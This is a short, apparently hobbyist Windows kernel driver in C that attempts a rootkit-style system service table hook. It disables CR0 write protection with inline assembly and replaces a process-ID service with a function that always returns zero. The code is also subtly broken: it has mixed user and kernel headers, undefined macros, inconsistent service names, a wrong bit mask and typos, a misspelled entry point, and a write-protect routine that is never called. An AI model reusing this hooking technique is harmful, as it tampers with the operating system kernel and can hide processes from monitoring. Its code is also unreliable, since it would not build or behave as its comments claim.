#include <ntddk.h>
#include<stdlib.h>
#include<Windows.h>
#include<stdio.h>
//globals that holds the addresses of the original function that we will be hooking
DWORD GetProcesssIdOriginalAddress;

//hooker function that will always return 0 as pid fo each process
DWORD MyGetProcessId([in] HANDLE Process)
{
	DWORD ReturnValue = GetProcessId(Process);
	return ReturnValue * 0;
}


void ExitDriver(PDRIVER_OBJECT Driver)
{
	//this code will be executed when the driver exits out:
	InterlockedExchange((PLONG)&SYSTEMSERVICE(ZwQueryGetProcessId), (LONG)GetProcesssIdOriginalAddress);
	TurnWriteProtectionOn();

}


//code snippet to turn of CRO bit 16-WP(write protection). we will be masking the cro register with 11111110111..-16 so everything will remain the same except cr0
void TurnWriteProctetionOff()
{
	__asm
	{
		push eax
		mov eax, CR0
		mov edx, 0b00000000000000001000000000000000
		not edx
		and eax, edx;
		mov CR0, eax
		pop eax
	}
}

//code snippet to turn on CRO bit 16 in order to turn back on write protection. or with 0 will remian the same. except for the 16ns bit wich will get a1
void TurnWriteProtectionOn()
{
	__asm
	{
		push edx
		mov edx, CR0
		or edx, 0b1000000000000000
		mov CRO, edx
		pop edx
	}
}



NTSTATUS DriverEnteryPoint( PUNICODE_STRING Path, PDRIVER_OBJECT Driver)
{
	//defining the unlooader
	Driver->DriverUnload = ExitDriver;

	//using the function Interlocked Exchange that is capeble of swapping 2 values. 
	// it overrides the values at a ceratin addr and returns thae value that was before the override
	
	GetProcesssIdOriginalAddress=InterlockedExchange((PLONG)&SYSTEMSERVICE(ZwGetProcessId),
		(LONG)MyGetProcessId);
	//returning if suceeded
	return 0x40000000;
}
